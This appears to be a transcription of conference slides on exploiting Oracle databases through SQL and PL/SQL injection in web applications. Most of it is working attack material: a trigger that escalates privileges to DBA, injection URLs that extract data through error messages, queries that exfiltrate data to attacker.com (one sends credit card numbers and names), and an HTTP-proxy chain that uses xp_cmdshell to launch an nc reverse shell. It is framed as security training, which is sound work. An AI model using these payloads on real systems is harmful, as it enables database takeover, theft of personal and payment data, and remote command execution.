### Hacking Oracle from Web Applications

**Date: 6/11/2010**
**Presenter: Dan Haagman, InfoSecurity 2009**

#### Indirect Privilege Escalation via PL/SQL Injection

**Slide 22: Creating a Trigger for Privilege Escalation**

```sql
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE TRIGGER "SYSTEM".the_trigger2
    BEFORE INSERT ON system.OL$ FOR EACH ROW
    BEGIN
      SCOTT.Z();
      DBMS_OUTPUT.PUT_LINE(''aa'');
    END;';
  RETURN 1;
END;
```

- **Explanation**: This PL/SQL block creates a trigger in the `SYSTEM` schema that calls `SCOTT.Z()`, which is executed with `SYSTEM` privileges.
- **Impact**: If the public has insert privileges on the `system.OL$` table, `SCOTT.Z()` will be executed, potentially escalating privileges to DBA.

**Slide 23: Exploitation of Indirect Privilege Escalation**

- **Trigger Creation**: The trigger is created in the `SYSTEM` schema.
- **Public Insert Privileges**: The public has insert privileges on the `system.OL$` table.
- **Privilege Execution**: `SCOTT.Z()` is executed with `SYSTEM` privileges, making `SCOTT` a DBA.

**Slide 24: Exploiting PL/SQL Injections in Web Applications**

- **Context**: Indirect privilege escalation can be used from web applications when exploiting PL/SQL injections.
- **Example Query**: 
  ```sql
  $query = "SELECT * FROM all_objects WHERE object_name = '".$_GET['name']."'";
  ```
- **Vulnerability**: This query is susceptible to SQL injection if user input is not properly sanitized.

**Slide 25: SQL Injection Example**

- **URL**: `http://vulnsite.com/ora.php?name=' or '1'='1`
- **Injection**: The query becomes:
  ```sql
  SELECT * FROM all_objects WHERE object_name = '' or '1'='1';
  ```

**Slide 26: Exploiting SQL Injection**

- **Error Message Enabled**: Error messages can reveal information.
- **Error Message Disabled**: Techniques like union queries, blind injection, and time delays can be used.
- **Techniques**:
  - **Union Query**
  - **Blind Injection**
  - **Time Delay/Heavy Queries**
  - **Out of Band Channel**

**Slide 27: Extracting Data via Error Messages**

- **Example URL**: `http://192.168.2.10/ora2.php?name=' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT USER FROM DUAL))--`
- **Impact**: This can extract the current user's name from the database.

**Slide 28: Error Messages in Oracle 10g**

- **Behavior**: Oracle 10g error messages can be used to extract arbitrary information.

**Slide 29: Network ACL in Oracle 11g**

- **Behavior**: From Oracle 11g onwards, network ACLs prevent functions that could cause network access, such as `UTL_INADDR.GET_HOST_ADDRESS()`.
- **Error**: `ORA-24247: network access denied by access control list (ACL)`

**Slide 30: Alternative Functions in Oracle 11g**

- **Function**: `CTXSYS.DRITHSX.SN(1, (SQL_QUERY_TO_EXECUTE))`
- **Example URL**: `http://192.168.2.10/ora1.php?name=' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT USER FROM DUAL))--`

**Slide 31: Blind SQL Injection Techniques**

- **Boolean Logic**: Using true and false conditions to infer data.
- **Time Delays**: Causing the database to delay responses to infer data.

**Slide 32: Out of Band Channels**

- **Description**: Making the database server open network connections to an attacker’s site.
- **Allowed Traffic**: HTTP and DNS outbound traffic are typically allowed.
- **Example Query**:
  ```sql
  SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM DUAL)||'.attacker.com') FROM DUAL;
  ```

**Slide 33: Out of Band in Oracle 11g**

- **Behavior**: Network ACLs in Oracle 11g prevent functions that could cause network access.
- **Error**: `ORA-24247: network access denied by access control list (ACL)`

**Slide 34: One Query to Get Them All**

- **Example Query**:
  ```sql
  SELECT SUM(LENGTH(UTL_HTTP.REQUEST('http://attacker.com/'||ccnumber||'.'||fname||'.'||lname))) FROM creditcard;
  ```
- **Impact**: This query can exfiltrate sensitive data through HTTP requests.

**Slide 35: Oracle as an HTTP Proxy**

- **Example URL**: `http://vuln.com/ora2.php?name=-5 UNION SELECT CAST(SUBSTR(HTTPURITYPE('http://127.0.0.1:8080/sqlinjection/default3.asp').getclob(),1,1000) AS VARCHAR(1000)) FROM DUAL--`
- **Impact**: The database can be used to proxy HTTP requests, allowing access to internal networks.

**Slide 36: Exploiting Internal Networks**

- **Example URL**: `http://172.16.56.128:81/ora2.php?name=-5 UNION SELECT CAST(SUBSTR(HTTPURITYPE('http://127.0.0.1/sqlinjection/default3.asp?qid=1;exec master..xp_cmdshell "C:\nc.exe 172.16.56.1 4444 -e cmd.exe" ').getclob(),1,3000) AS VARCHAR(3000)) FROM DUAL--`
- **Impact**: This can execute commands on the internal network, leading to further exploitation.

**Slide 37: Privileged vs. Unprivileged SQL Injection**

- **Privileged**:
  - **DBA Privileges**: The application connects to the database with DBA privileges.
  - **Procedure Owner**: SQL injection in a procedure owned by a DBA.
- **Unprivileged**:
  - **Create Session**: Limited privileges, such as create session and other non-DBA privileges.

**Slide 38: Conclusion**

- **Key Takeaways**:
  - Indirect privilege escalation via PL/SQL injection.
  - Exploitation techniques for both error-enabled and error-disabled scenarios.
  - Use of out-of-band channels and Oracle as an HTTP proxy.
  - Differentiation between privileged and unprivileged SQL injection.

**Company Overview: 7Safe Company Overview 2009**
**Course: Secure Coding Course, © 7Safe**

This presentation provides a comprehensive overview of how to exploit Oracle databases from web applications, including detailed examples and techniques for various types of SQL injection and privilege escalation.